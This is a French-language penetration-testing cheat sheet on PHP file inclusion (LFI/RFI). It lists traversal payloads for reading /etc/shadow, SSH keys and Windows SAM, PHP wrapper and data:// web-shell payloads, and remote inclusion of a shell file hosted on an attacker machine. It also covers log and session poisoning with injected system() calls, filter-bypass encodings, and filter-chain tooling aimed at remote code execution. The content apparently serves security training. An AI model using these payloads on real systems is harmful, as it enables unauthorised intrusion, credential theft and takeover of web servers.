# 20 — File Inclusion

## Objectifs
Exploiter LFI/RFI : lecture de fichiers, wrappers PHP, log poisoning, session poisoning, bypass de filtres, jusqu'à la RCE.

---

## 1. Détection

```bash
# Paramètres suspects
?page=about.php
?file=home
?include=news
?lang=en
?template=default
?doc=report.pdf

# Test de traversée
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=http://<LHOST>/shell.txt
```

```bash
# Fuzzing
ffuf -u "http://<TARGET>/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
```

---

## 2. LFI — lecture de fichiers

```bash
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../etc/hosts
?page=../../../../proc/self/environ
?page=../../../../proc/self/cmdline
?page=../../../../var/log/apache2/access.log
?page=../../../../home/<USER>/.ssh/id_rsa
?page=../../../../var/www/html/config.php
?page=C:\Windows\win.ini
?page=C:\Windows\System32\drivers\etc\hosts
?page=..\..\..\..\Windows\win.ini
```

### Fichiers Linux utiles
```
/etc/passwd /etc/shadow /etc/hosts /etc/hostname /etc/crontab
/etc/apache2/apache2.conf /etc/nginx/nginx.conf
/proc/self/environ /proc/self/cmdline /proc/self/cwd/
/root/.ssh/id_rsa /home/*/.ssh/id_rsa /home/*/.bash_history
/var/log/apache2/access.log /var/log/auth.log /var/log/vsftpd.log
/var/www/html/config.php /var/www/html/wp-config.php
```

### Fichiers Windows utiles
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<USER>\.ssh\id_rsa
C:\Windows\Panther\unattend.xml
```

---

## 3. Wrappers PHP

```bash
# Source en base64
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/etc/passwd

# Chaîne de filtres (RCE sans fichier, PHP < 8)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...

# Data wrapper (allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
data://text/plain,<?php system($_GET['c']); ?>

# Input wrapper
php://input   (POST: <?php system('id'); ?>)

# Expect (extension installée)
expect://id
```

---

## 4. RFI

```bash
# Test
?page=http://<LHOST>:8000/shell.txt
?page=https://<LHOST>:8443/shell.txt
?page=ftp://<LHOST>/shell.txt
?page=\\<LHOST>\share\shell.txt

# shell.txt
<?php system($_GET['c']); ?>
```

```bash
# Serveur
python3 -m http.server 8000
# Puis
curl "http://<TARGET>/index.php?page=http://<LHOST>:8000/shell.txt&c=id"
```

> RFI nécessite `allow_url_include=On` (rare par défaut).

---

## 5. Log poisoning

### Apache access.log
```bash
# Injecter du PHP dans le User-Agent
curl -A '<?php system($_GET["c"]); ?>' http://<TARGET>/
# Puis
curl "http://<TARGET>/index.php?page=../../../../var/log/apache2/access.log&c=id"
```

### SSH auth.log
```bash
ssh '<?php system($_GET["c"]); ?>'@<TARGET>
curl "http://<TARGET>/?page=../../../../var/log/auth.log&c=id"
```

### FTP / mail
```bash
# /var/log/vsftpd.log via username
ftp <TARGET>   # user: <?php system($_GET['c']); ?>
# /var/mail/<USER>
```

---

## 6. Session poisoning

```bash
# Écrire du PHP dans une valeur de session
curl -c cookies.txt -b cookies.txt "http://<TARGET>/index.php" --data "name=<?php system(\$_GET['c']); ?>"
# Inclure le fichier de session
?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>
```

### /proc/self/environ
```bash
curl -A '<?php system($_GET["c"]); ?>' "http://<TARGET>/?page=../../../../proc/self/environ&c=id"
```

### phpinfo + LFI (race condition)
Si `phpinfo.php` est accessible, utiliser un script qui envoie un fichier temporaire et l'inclut avant suppression (`phpinfo LFI exploit`).

---

## 7. Bypass de filtres

| Filtre | Bypass |
|---|---|
| `../` supprimé | `....//`, `..././`, `..%2f`, `%2e%2e/` |
| `../` une fois | `....//....//` |
| Extension `.php` ajoutée | null byte `%00` (PHP < 5.3.4), `?` |
| Chemin absolu bloqué | `php://filter`, wrappers |
| `http` bloqué | `data://`, `php://input`, `expect://` |
| Liste blanche de préfixe | `../../`, ou `php://filter` |
| `etc/passwd` filtré | `/etc/passwd%00`, `/etc//passwd`, `/etc/./passwd` |
| WAF | double encodage `%252e%252e%252f` |

```bash
# Encodages
%2e%2e%2f
%2e%2e/
..%252f
%c0%ae%c0%ae/
```

### Null byte (anciens PHP)
```bash
?page=../../../../etc/passwd%00
?page=shell.php%00.jpg
```

---

## 8. Vers RCE

```bash
# 1. Log poisoning → web shell
# 2. Upload + LFI (image avec PHP dans les métadonnées)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
# Puis ?page=uploads/image.jpg (si le fichier est interprété comme PHP)
# 3. /proc/self/fd/<N> (fichier temporaire d'upload)
# 4. Session files
# 5. Wrappers data:// / expect://
# 6. php_filter_chain_generator (RCE sans upload)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```

### php_filter_chain_generator
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Copier l'URL générée dans ?page=
```

---

## 9. Outils

```bash
# LFISuite
python2 lfisuite.py

# Kadimus
kadimus -u "http://<TARGET>/?page=index.php" -L

# Fuzzing de payloads
ffuf -u "http://<TARGET>/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
```

---

## Checklist
- [ ] Paramètre vulnérable identifié
- [ ] Profondeur de traversée déterminée
- [ ] Fichiers sensibles lus (passwd, config, clés)
- [ ] Wrappers testés
- [ ] Log/session poisoning tenté
- [ ] RCE obtenue et documentée
- [ ] Filtres contournés

## Aide-mémoire
| Wrapper | Usage |
|---|---|
| `php://filter` | lire/encoder des sources |
| `php://input` | POST comme code |
| `data://` | code inline |
| `expect://` | commande directe |
| `phar://` | désérialisation / lecture |
| `zip://` | contenu d'une archive |
